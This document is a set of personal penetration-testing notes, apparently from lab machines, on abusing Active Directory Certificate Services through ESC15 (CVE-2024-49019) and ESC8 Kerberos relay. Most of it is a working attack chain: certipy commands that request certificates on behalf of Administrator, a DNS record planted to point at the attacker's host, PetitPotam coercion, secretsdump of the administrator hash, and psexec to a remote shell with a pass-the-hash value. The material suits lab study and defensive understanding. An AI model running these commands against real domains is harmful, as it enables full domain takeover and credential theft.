# ECS - Quick and dirty tips (not yet fully written)

## ECS 15
```
Important point :
- Certificate Name Flag : EnrolleeSuppliesSubject > The name indicated we can supply the subject so we can supply a different EKU
- Schema Version is 1
- Not patched for CVE-2024-49019


Information :
EKU (Extended Key Usage) : Server Authentication > used for auth originally

Idea :
The certificate is supposed to only give us a cert server authentication but we will use it with another policy : the certificate request agent then exploit ESC3 for the "User" template
We won't be able to reuse the template WebServer specifically for user authentication since the EKU of this template is "Server Authentication".
We find other template with schema version 1 to replay the certificate to auth as a user.

So
1. We request a certificate using the template "WebServer" that gives us the right to generate other certificate > we request a certificate with EKU "Certificate Request Agent" instead of the ability to "Server Authentication"
certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer (-upn administrator@tombwatcher.htb) -application-policies 'Certificate Request Agent'
Let's call this cert : cert_admin_generatecert.pfx
2. With this certificate, we use the "User" template suffering from ECS3 that has the "User Authentication" as the EKU that will let us authenticate

# Exploitation
certipy-ad find -dc-host dc01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p 'rogue' -vulnerable -stdout

The template is vulnerable to ESC15 , tracked as CVE-2024-49019 (also known as "EKUwu"). This vulnerability affects certificate templates with Schema Version 1 where the enrollee supplies the subject. Because Schema Version 1 templates do not enforce Application Policy constraints, an attacker can inject a Client Authentication application policy into the certificate request. This effectively turns a Server Authentication -only template into one that can be used for client authentication — enabling impersonation of any domain user. 

First, we request a certificate from the CA tombwatcher-CA-1 using the WebServer template with cert_admin as the subject, and add the Enrollment Agent application policy to it. 


certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'rogue' -dc-ip 10.129.11.1 -template WebServer --application-policies '1.3.6.1.4.1.311.20.2.1' -target-ip 10.129.11.1

As the acquired certificate, cert_admin.pfx is now functioning as an Enrollment Agent Certificate , we can request certificates for any other user. We will proceed to issue a certificate on behalf of the Administrator user.

certipy req -u cert_admin -p 'rogue' -dc-ip 10.129.11.1 -target-ip 10.129.11.1 -ca tombwatcher-CA-1 -template User -on-behalf-of 'tombwatcher\administrator' -pfx cert_admin.pfx

Finally, we will use certipy 's auth module to authenticate against the DC using the acquired administrator certificate and retrieve the administrator's hash.

certipy auth -dc-ip 10.129.11.1 -pfx administrator.pfx
```

# ECS 8 - Kerberos way
```
# ECS 8 - Kerberos way
certipy find -target DC-JPQ225.cicada.vl -u Rosie.Powell@cicada.vl -p Cicada123 -k - vulnerable -stdout <SNIP> !] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 6B8F71DF18F81D804D7BF4E3504C6C4D
    Certificate Validity Start          : 2025-06-16 20:31:15+00:00
    Certificate Validity End            : 2525-06-16 20:41:15+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates

There are no vulnerable certificates but the Certification Authority is vulnerable to ESC8 since HTTP web enrollemnt is enabled. To exploit this, we need to trick the DC to authenticate to us and then relay the authentication to that endpoint and get a certificate as the DC that way. 
The problem in this approach is that self NTLM relay is blocked and NTLM authentication is disabled in general in this scenario, so our only option is to explore Kerberos relay.

- SMB method
Reading through this blogpost (https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) we discover that we can relay Kerberos over SMB using a specific DNS entry. Let's follow the steps described on the post to exploit this vulnerabillity. First of all, we need to add the magic DNS entry and make it point back to our machine.

1. we need to add the magic DNS entry and make it point back to our machine.
 bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.65

 2. we setup a relay using certipy once again.
Note: Make sure you are using one of the latest versions of certipy that support the relay option
Note: make sur your port 445 is open !
certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController 
[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8) 
[*] Listening on 0.0.0.0:445 
[*] Setting up SMB Server on port 445 

3. use nxc to corce the remote machine to authenticate back to us using Kerberos.

nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam

On our relay command we notice the following output :
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED
[*] Requesting certificate for '\\' based on the template 'DomainController'
...
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl
[*] Saving certificate and private key to 'dc-jpq225.pfx'
...

4.  use that certificate to authenticate as the machine itself.
certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48

5. We have the NTLM hash of the machine account. Since NTLM authentication is disabled, can use the ccache file and dump the hashes of the Administrator user.
Ccache file was obtained the step before.
KRB5CCNAME=dc-jpq225.ccache secretsdump.py -k -no-pass cicada.vl/dc-jpq225\$@dc- jpq225.cicada.vl -just-dc-user administrator

6. Remote shell as Admin 
impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87

# RemoteKrbRelay method
exploit this vulnerabillity, is from a Windows VM. 

1. Let's check the machine account quota of the current user.
nxc ldap DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M maq

Since the machine account quota is 10, we can domain join our very own Windows VM and then use the RemoteKrbRelay tool to automate the relaying phase of the attack.

cf VulnCicada write-up
```